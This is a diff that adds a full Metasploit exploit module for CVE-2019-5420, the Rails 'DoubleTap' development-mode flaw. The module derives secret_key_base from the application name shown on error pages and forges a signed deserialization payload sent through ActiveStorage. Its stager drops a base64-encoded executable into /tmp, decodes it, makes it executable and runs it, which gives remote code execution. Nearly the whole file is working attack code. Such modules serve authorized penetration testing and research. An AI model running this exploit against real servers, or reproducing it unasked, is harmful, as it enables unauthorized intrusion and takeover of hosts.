@@ -1,0 +1,225 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Msf::Auxiliary::Report
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Ruby On Rails DoubleTap Development Mode secret_key_base Vulnerability',
+      'Description'    => %q{
+        This module exploits a vulnerability in Ruby on Rails. In development mode, a Rails
+        application would use its name as the secret_key_base, and can be easily extracted by
+        visiting an invalid resource for a path. As a result, this allows a remote user to
+        create and deliver a signed serialized payload, load it by the application, and gain
+        remote code execution.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'ooooooo_q', # Reported the vuln on hackerone
+          'mpgn',      # Proof-of-Concept
+          'sinn3r'     # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-5420' ],
+          [ 'URL', 'https://hackerone.com/reports/473888' ],
+          [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],
+          [ 'URL', 'https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2019-5420/rubyonrails-security/IsQKvDqZdKw/UYgRCJz2CgAJ' ]
+        ],
+      'Platform'       => 'linux',
+      'Targets'        =>
+        [
+          [ 'Ruby on Rails 5.2 and prior', { } ]
+        ],
+      'DefaultOptions' =>
+        {
+          'RPORT' => 3000
+        },
+      'Notes'          =>
+        {
+          'AKA'         => [ 'doubletap' ],
+          'Stability'   => [ CRASH_SAFE  ],
+          'SideEffects' => [ IOC_IN_LOGS ]
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => 'Mar 13 2019',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The route for the Rails application', '/']),
+      ])
+  end
+
+  NO_RAILS_ROOT_MSG = 'No Rails.root info'
+
+  # These mocked classes are borrowed from Rails 5. I had to do this because Metasploit
+  # still uses Rails 4, and we don't really know when we will be able to upgrade it.
+
+  class Messages
+    class Metadata
+      def initialize(message, expires_at = nil, purpose = nil)
+        @message, @expires_at, @purpose = message, expires_at, purpose
+      end
+
+      def as_json(options = {})
+        { _rails: { message: @message, exp: @expires_at, pur: @purpose } }
+      end
+
+      def self.wrap(message, expires_at: nil, expires_in: nil, purpose: nil)
+        if expires_at || expires_in || purpose
+          ActiveSupport::JSON.encode new(encode(message), pick_expiry(expires_at, expires_in), purpose)
+        else
+          message
+        end
+      end
+
+      private
+
+      def self.pick_expiry(expires_at, expires_in)
+        if expires_at
+          expires_at.utc.iso8601(3)
+        elsif expires_in
+          Time.now.utc.advance(seconds: expires_in).iso8601(3)
+        end
+      end
+
+      def self.encode(message)
+        Rex::Text::encode_base64(message)
+      end
+    end
+  end
+
+  class MessageVerifier
+    def initialize(secret, options = {})
+      raise ArgumentError, 'Secret should not be nil.' unless secret
+      @secret = secret
+      @digest = options[:digest] || 'SHA1'
+      @serializer = options[:serializer] || Marshal
+    end
+
+    def generate(value, expires_at: nil, expires_in: nil, purpose: nil)
+      data = encode(Messages::Metadata.wrap(@serializer.dump(value), expires_at: expires_at, expires_in: expires_in, purpose: purpose))
+      "#{data}--#{generate_digest(data)}"
+    end
+
+    private
+
+    def generate_digest(data)
+      require "openssl" unless defined?(OpenSSL)
+      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)
+    end
+
+    def encode(message)
+      Rex::Text::encode_base64(message)
+    end
+  end
+
+  def check
+    check_code = CheckCode::Safe
+    app_name = get_application_name
+    check_code = CheckCode::Appears unless app_name.blank?
+    test_payload = %Q|puts 1|
+    rails_payload = generate_rails_payload(app_name, test_payload)
+    result = send_serialized_payload(rails_payload)
+    check_code = CheckCode::Vulnerable if result
+    check_code
+  rescue Msf::Exploit::Failed => e
+    vprint_error(e.message)
+    return check_code if e.message.to_s.include? NO_RAILS_ROOT_MSG
+    CheckCode::Unknown
+  end
+
+  # Returns information about Rails.root if we retrieve an invalid path under rails.
+  def get_rails_root_info
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'rails', Rex::Text.rand_text_alphanumeric(32)),
+    })
+
+    fail_with(Failure::Unknown, 'No response from the server') unless res
+    html = res.get_html_document
+    rails_root_node = html.at('//code[contains(text(), "Rails.root:")]')
+    fail_with(Failure::NotVulnerable, NO_RAILS_ROOT_MSG) unless rails_root_node
+    root_info_value = rails_root_node.text.scan(/Rails.root: (.+)/).flatten.first
+    report_note(host: rhost, type: 'rails.root_info', data: root_info_value, update: :unique_data)
+    root_info_value
+  end
+
+  # Returns the application name based on Rails.root. It seems in development mode, the
+  # application name is used as a secret_key_base to encrypt/decrypt data.
+  def get_application_name
+    root_info = get_rails_root_info
+    root_info.split('/').last.capitalize
+  end
+
+  # Returns the stager code that writes the payload to disk so we can execute it.
+  def get_stager_code
+    b64_fname = "/tmp/#{Rex::Text.rand_text_alpha(6)}.bin"
+    bin_fname = "/tmp/#{Rex::Text.rand_text_alpha(5)}.bin"
+    register_file_for_cleanup(b64_fname, bin_fname)
+    p = Rex::Text.encode_base64(generate_payload_exe)
+
+    c  = "File.open('#{b64_fname}', 'wb') { |f| f.write('#{p}') }; "
+    c << "%x(base64 --decode #{b64_fname} > #{bin_fname}); "
+    c << "%x(chmod +x #{bin_fname}); "
+    c << "%x(#{bin_fname})"
+    c
+  end
+
+  # Returns the serialized payload that is embedded with our malicious payload.
+  def generate_rails_payload(app_name, ruby_payload)
+    secret_key_base = Digest::MD5.hexdigest("#{app_name}::Application")
+    keygen = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
+    secret = keygen.generate_key('ActiveStorage')
+    verifier = MessageVerifier.new(secret)
+    erb = ERB.allocate
+    erb.instance_variable_set :@src, ruby_payload
+    erb.instance_variable_set :@filename, "1"
+    erb.instance_variable_set :@lineno, 1
+    dump_target = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
+    verifier.generate(dump_target, purpose: :blob_key)
+  end
+
+  # Sending the serialized payload
+  # If the payload fails, the server should return 404. If successful, then 200.
+  def send_serialized_payload(rails_payload)
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => "/rails/active_storage/disk/#{rails_payload}/test",
+    })
+
+    if res && res.code != 200
+      print_error("It doesn't look like the exploit worked. Server returned: #{res.code}.")
+      print_error('The expected response should be HTTP 200.')
+
+      # This indicates the server did not accept the payload
+      return false
+    end
+
+    # This is used to indicate the server accepted the payload
+    true
+  end
+
+  def exploit
+    print_status("Attempting to retrieve the application name...")
+    app_name = get_application_name
+    print_status("The application name is: #{app_name}")
+
+    stager = get_stager_code
+    print_status("Stager ready: #{stager.length} bytes")
+
+    rails_payload = generate_rails_payload(app_name, stager)
+    print_status("Sending serialized payload to target (#{rails_payload.length} bytes)")
+    send_serialized_payload(rails_payload)
+  end
+end
